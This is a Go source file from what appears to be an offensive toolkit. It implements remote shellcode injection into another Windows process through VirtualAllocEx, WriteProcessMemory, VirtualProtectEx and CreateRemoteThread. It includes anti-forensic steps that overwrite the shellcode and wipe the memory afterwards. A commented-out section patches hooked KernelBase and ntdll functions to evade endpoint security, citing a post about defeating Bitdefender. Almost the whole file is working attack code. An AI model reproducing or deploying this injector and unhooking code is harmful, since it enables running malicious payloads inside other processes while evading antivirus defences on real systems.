// +build windows

package injector

import (
	"context"
	"time"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/module/windows/api"
	"project/internal/random"
	"project/internal/security"
)

// InjectShellcode is used to inject shellcode to a process.
// It will block until shellcode execute finish.
// warning: shellcode slice will be covered.
func InjectShellcode(pid uint32, sc []byte) error {
	defer security.CoverBytes(sc)
	// open target process
	const da = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ | windows.SYNCHRONIZE
	rHandle, err := api.OpenProcess(da, false, pid)
	if err != nil {
		return err
	}
	defer func() { api.CloseHandle(rHandle) }()

	doneVA := security.SwitchThreadAsync()
	// alloc memory for shellcode
	scSize := uintptr(len(sc))
	const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
	memAddress, err := api.VirtualAllocEx(rHandle, 0, scSize, memType, windows.PAGE_READWRITE)
	if err != nil {
		return err
	}
	// write shellcode
	rand := random.NewRand()
	doneWPM := security.SwitchThreadAsync()
	for i := uintptr(0); i < scSize; i++ {
		index := int(i)
		_, err = api.WriteProcessMemory(rHandle, memAddress+i, []byte{sc[index]})
		if err != nil {
			return errors.WithMessage(err, "failed to write shellcode to target process")
		}
		// cover shellcode at once
		sc[index] = byte(rand.Int64())
	}
	// set shellcode page execute
	doneVP := security.SwitchThreadAsync()
	oldProtect := new(uint32)
	err = api.VirtualProtectEx(rHandle, memAddress, scSize, windows.PAGE_EXECUTE, oldProtect)
	if err != nil {
		return err
	}
	doneCRT := security.SwitchThreadAsync()
	// execute shellcode
	threadHandle, _, err := api.CreateRemoteThread(rHandle, nil, 0, memAddress, nil, 0)
	if err != nil {
		return err
	}
	defer func() { api.CloseHandle(threadHandle) }()
	// wait thread switch
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	security.WaitSwitchThreadAsync(ctx, doneVA, doneWPM, doneVP, doneCRT)
	// wait thread finish
	_, err = windows.WaitForSingleObject(threadHandle, windows.INFINITE)
	if err != nil {
		return errors.Wrap(err, "failed to wait thread")
	}
	// clean shellcode and free it
	doneVP = security.SwitchThreadAsync()
	err = api.VirtualProtectEx(rHandle, memAddress, scSize, windows.PAGE_READWRITE, oldProtect)
	if err != nil {
		return err
	}
	doneWPM = security.SwitchThreadAsync()
	for i := uintptr(0); i < scSize; i++ {
		_, err = api.WriteProcessMemory(rHandle, memAddress+i, []byte{byte(rand.Int64())})
		if err != nil {
			return errors.WithMessage(err, "failed to cover shellcode to target process")
		}
	}
	err = windows.VirtualFree(memAddress, 0, windows.MEM_RELEASE)
	if err != nil {
		return errors.Wrap(err, "failed to release covered memory")
	}
	ctx, cancel = context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	security.WaitSwitchThreadAsync(ctx, doneVP, doneWPM)
	return nil
}

// api-unhooking, but maybe add a script engine to execute it.

// reference:
// https://shells.systems/defeat-bitdefender-total-security-using-
// windows-api-unhooking-to-perform-process-injection

// var (
//	modKernelBase = windows.NewLazySystemDLL("KernelBase.dll")
//	modNTDLL      = windows.NewLazySystemDLL("ntdll.dll")
//
//	procCreateRemoteThreadEx = modKernelBase.NewProc("CreateRemoteThreadEx")
//	procNtWriteVirtualMemory = modNTDLL.NewProc("NtWriteVirtualMemory")
//	procZwCreateThreadEx     = modNTDLL.NewProc("ZwCreateThreadEx")
// )

// 	pHandle := windows.CurrentProcess()
// 	// patch 1: unhook CreateRemoteThreadEx in KernelBase.dll
// 	err := procCreateRemoteThreadEx.Find()
// 	if err != nil {
// 		return err
// 	}
// 	crtAddress := procCreateRemoteThreadEx.Addr()
// 	fmt.Printf("0x%X\n", crtAddress)
//
// 	patch := []byte{0x4C, 0x8B, 0xDC, 0x53, 0x56} // move r11,rsp
// 	_, err = api.WriteProcessMemory(pHandle, crtAddress, patch)
// 	if err != nil {
// 		return errors.WithMessage(err, "failed to unhook CreateRemoteThreadEx")
// 	}
// 	// patch 2: unhook NtWriteVirtualMemory in ntdll.dll
// 	err = procNtWriteVirtualMemory.Find()
// 	if err != nil {
// 		return err
// 	}
// 	wvmAddress := procNtWriteVirtualMemory.Addr()
// 	fmt.Printf("0x%X\n", wvmAddress)
//
// 	patch = []byte{0x4C, 0x8B, 0xD1, 0xB8, 0x3A} // mov eax,3A
// 	_, err = api.WriteProcessMemory(pHandle, wvmAddress, patch)
// 	if err != nil {
// 		return errors.WithMessage(err, "failed to unhook NtWriteVirtualMemory")
// 	}
// 	// patch 3: unhook ZwCreateThreadEx in ntdll.dll
// 	err = procZwCreateThreadEx.Find()
// 	if err != nil {
// 		return err
// 	}
// 	ctAddress := procZwCreateThreadEx.Addr()
// 	fmt.Printf("0x%X\n", ctAddress)
//
// 	patch = []byte{0x4C, 0x8B, 0xD1, 0xB8, 0xBD} // mov eax,BD
// 	_, err = api.WriteProcessMemory(pHandle, ctAddress, patch)
// 	if err != nil {
// 		return errors.WithMessage(err, "failed to unhook ZwCreateThreadEx")
// 	}
